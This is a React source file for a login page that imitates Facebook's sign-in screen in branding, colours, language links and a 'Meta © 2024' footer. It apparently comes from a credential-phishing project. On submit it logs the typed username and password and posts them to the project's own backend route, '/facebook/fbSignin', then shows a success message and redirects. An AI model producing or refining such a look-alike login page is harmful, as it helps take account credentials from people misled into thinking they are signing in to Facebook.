import React from 'react'
import { useFormik } from 'formik'
import * as Yup from "yup"
import axios from 'axios'
import { useNavigate } from 'react-router-dom'

const Facebookpage = () => {
  const navigate = useNavigate()
  const formik = useFormik({
    initialValues: {
      fbUsername: "",
      fbPassword: "",
    },
    validationSchema: Yup.object({
      fbUsername: Yup.string()
        .required('Required'),
      fbPassword: Yup.string()
        .required('Required'),

    }),
    onSubmit: values => {
      let successMessage, errorMessage;
      let allDetails = {
        myfbUsername: values.fbUsername, myfbPassword: values.fbPassword
      }
      console.log(allDetails)
      axios.post("http://localhost:3600/facebook/fbSignin", allDetails)
        .then((response) => {
          const errorMessage = response.data.message;
          const sucessMessage = response.data.message;

          if (!response.data.status) {
            Swal.fire({
              icon: "error",
              title: "<h3>Registration Failed</h3>",
              text: errorMessage
            });
          } else {
            Swal.fire({
              position: "center",
              icon: "success",
              title: "<h3>Success</h3>",
              text: sucessMessage,
              showConfirmButton: false,
              timer: 1500
            });
            navigate("/si")
          }
        })
        .catch((err) => {
          console.log(err);
          const errmessage = err.response.data.message
          Swal.fire({
            icon: "error",
            title: "<h3>Error Occured</h3>",
            text: errmessage
          });
        })
    }
  })
  return (
    <>
      <form action="" onSubmit={formik.handleSubmit}>
        <div className='fbcontainer'>
          <div className='innercontainer'>
            <div className='text-center'>
              <h5 className='fbstylewords'>
                facebook
              </h5>

              <div className='mt-3'>
                <div>
                  <input placeholder="Mobile number or email address" class="styled-input" type="text" name="fbUsername" 
                  onChange={formik.handleChange}
                  onBlur={formik.handleBlur}
                  value={formik.values.fbUsername}
                  />
                  {/* <input
                    className={`form-control ${(formik.values.fbUsername && !formik.errors.fbUsername) ||
                      (formik.touched.fbUsername && formik.values.fbUsername && formik.errors.fbUsername && formik.touched.fbUsername && formik.values.fbUsername)
                      ? 'is-valid'
                      : formik.values.fbUsername || formik.touched.fbUsername
                        ? 'is-invalid'
                        : ''
                      }`}
                    onChange={formik.handleChange}
                    onBlur={formik.handleBlur}
                    value={formik.values.fbUsername}
                    name="fbUsername"
                  /> */}
                </div>
                <div>
                  <input placeholder="Password" class="styled-input my-2" type="password" name="fbPassword" 
                  onChange={formik.handleChange}
                  onBlur={formik.handleBlur}
                  value={formik.values.fbPassword}
                  />
                  {/* <input
                    className={`form-control ${(formik.values.fbPassword && !formik.errors.fbPassword) ||
                      (formik.touched.fbPassword && formik.values.fbPassword && formik.errors.fbPassword && formik.touched.fbPassword && formik.values.fbPassword)
                      ? 'is-valid'
                      : formik.values.fbPassword || formik.touched.fbPassword
                        ? 'is-invalid'
                        : ''
                      }`}
                    onChange={formik.handleChange}
                    onBlur={formik.handleBlur}
                    value={formik.values.fbPassword}
                    name="fbPassword"
                  /> */}
                </div>
                <div>
                  <button type='submit' className='loginfbBTN' style={{ backgroundColor: "#1877F2" }}>
                    <b className='text-white'>Log in</b>
                  </button>
                </div>
                <div className='mt-3'>
                  <p style={{ color: "#2185E5" }}>Forgotten password?</p>
                </div>
              </div>
              <div className='d-flex text-center'>
                <div className='w-50 mx-3'>
                  <hr />
                </div>
                <div>
                  <p>or</p>
                </div>
                <div className='w-50 mx-3'>
                  <hr />
                </div>
              </div>
            </div>
            <div className=''>
              <div className='fbcreateaccstylinginner'>
                <p className='fbcreateaccstyling'>Create new account</p>
              </div>
            </div>



          </div>
        </div>


        <div className='fbstylingtopwords d-flex justify-content-around'>
          <div style={{ lineHeight: "5px", color: "#576B95", fontSize: "13px" }} className='text-center'>
            <p style={{ color: "#9094B4" }}>
              English (UK)
            </p>
            <p>
              Français (France)
            </p>
            <p>
              Español
            </p>
            <p>
              Deutsch
            </p>
          </div>

          <div style={{ lineHeight: "5px", color: "#576B95", fontSize: "13px" }} className='text-center'>
            <p>Hausa</p>
            <p>Português (Brasil) </p>
            <p>
              العربية
            </p>

          </div>
        </div>


        <div style={{ color: "#9094B4", fontSize: "13px" }} className='text-center'>
          <p>Meta © 2024</p>
        </div>
      </form>
    </>
  )
}

export default Facebookpage